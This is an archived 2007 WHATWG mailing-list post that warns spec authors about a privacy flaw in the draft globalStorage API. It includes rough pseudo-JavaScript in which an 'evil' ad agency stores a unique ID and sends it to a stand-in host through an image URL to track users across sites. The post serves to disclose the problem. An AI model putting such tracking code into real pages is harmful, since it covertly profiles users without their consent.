<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<HTML>
 <HEAD>
   <TITLE> [whatwg] Potenial Security Problem in Global Storage Specification
   </TITLE>
   <LINK REL="Index" HREF="index.html" >
   <LINK REL="made" HREF="mailto:whatwg%40lists.whatwg.org?Subject=Re%3A%20%5Bwhatwg%5D%20Potenial%20Security%20Problem%20in%20Global%20Storage%20Specification&In-Reply-To=%3C82c3f5040705302213o5e22298ao89337a56931f1e6c%40mail.gmail.com%3E">
   <META NAME="robots" CONTENT="index,nofollow">
   <style type="text/css">
       pre {
           white-space: pre-wrap;       /* css-2.1, curent FF, Opera, Safari */
           }
   </style>
   <META http-equiv="Content-Type" content="text/html; charset=us-ascii">
   <LINK REL="Previous"  HREF="053835.html">
   <LINK REL="Next"  HREF="053840.html">
 </HEAD>
 <BODY BGCOLOR="#ffffff">
   <H1>[whatwg] Potenial Security Problem in Global Storage Specification</H1>
<!--htdig_noindex-->
    <B>Jerason Banes</B> 
    <A HREF="mailto:whatwg%40lists.whatwg.org?Subject=Re%3A%20%5Bwhatwg%5D%20Potenial%20Security%20Problem%20in%20Global%20Storage%20Specification&In-Reply-To=%3C82c3f5040705302213o5e22298ao89337a56931f1e6c%40mail.gmail.com%3E"
       TITLE="[whatwg] Potenial Security Problem in Global Storage Specification">jbanes at gmail.com
       </A><BR>
    <I>Wed May 30 22:13:56 PDT 2007</I>
    <P><UL>
        <LI>Previous message: <A HREF="053835.html">[whatwg] HTMLTableElement should have a createTBody method
</A></li>
        <LI>Next message: <A HREF="053840.html">[whatwg] Potenial Security Problem in Global Storage	Specification
</A></li>
         <LI> <B>Messages sorted by:</B> 
              <a href="date.html#53837">[ date ]</a>
              <a href="thread.html#53837">[ thread ]</a>
              <a href="subject.html#53837">[ subject ]</a>
              <a href="author.html#53837">[ author ]</a>
         </LI>
       </UL>
    <HR>  
<!--/htdig_noindex-->
<!--beginarticle-->
<PRE>Hello All!

This is my first post here, so apologies in advance if I'm not quite up on
the list etiquette.

I was just comparing the Storage API with that of the Google
Gears&lt;<A HREF="http://gears.google.com">http://gears.google.com</A>&gt;,
and something jumped out at me. According to the spec, browsers should allow
a webapp to store data in the globalStorage object with no domain attached.
(i.e. globalStorage['']) This is intended to allow data to be shared across
all webpages.

My concern is that this poses a problem for the user's privacy. Let's say
that I'm an Evil Advertisement site. It is in my interest to penetrate the
user's veil of privacy and determine which pages they visit. I've
traditionally used cookies for this, but the browser makers foiled my
attempts by allowing cookies to only be accepted from the originating site.
But thanks to the new globalStorage API, I can store a Unique ID in the
user's browser, then use Javascript to retrieve it every time they download
one of my ads.

Here's some rough psuedo-js to demonstrate how it might work:

&lt;script&gt;
if(!gloabalStorage[''].evilbit) gloabalStorage[''].evilbit = createUUID();

var createUUID()
{
    //return a unique identifier using a random algorithm.
}

var displayEvilAd(type)
{
    document.write('&lt;img src=&quot;<A HREF="http://www.eviladagency.com">http://www.eviladagency.com</A>' +
        '/getAdvertisement.asp' +
        '?type=' + type +
        '&amp;tracking=' + gloabalStorage[''].evilbit+'&quot;&gt;');
}
&lt;/script&gt;

...

&lt;script&gt;displayEvilAd(&quot;banner&quot;);&lt;/script&gt;

Is there something I'm missing that would prevent this?

Thanks,
Jerason Banes
-------------- next part --------------
An HTML attachment was scrubbed...
URL: &lt;<A HREF="http://lists.whatwg.org/pipermail/whatwg-whatwg.org/attachments/20070531/17461fdd/attachment-0001.htm">http://lists.whatwg.org/pipermail/whatwg-whatwg.org/attachments/20070531/17461fdd/attachment-0001.htm</A>&gt;
</PRE>

<!--endarticle-->
<!--htdig_noindex-->
    <HR>
    <P><UL>
        <!--threads-->
	<LI>Previous message: <A HREF="053835.html">[whatwg] HTMLTableElement should have a createTBody method
</A></li>
	<LI>Next message: <A HREF="053840.html">[whatwg] Potenial Security Problem in Global Storage	Specification
</A></li>
         <LI> <B>Messages sorted by:</B> 
              <a href="date.html#53837">[ date ]</a>
              <a href="thread.html#53837">[ thread ]</a>
              <a href="subject.html#53837">[ subject ]</a>
              <a href="author.html#53837">[ author ]</a>
         </LI>
       </UL>

<hr>
<a href="http://lists.whatwg.org/listinfo.cgi/whatwg-whatwg.org">More information about the whatwg
mailing list</a><br>
<!--/htdig_noindex-->
</body></html>
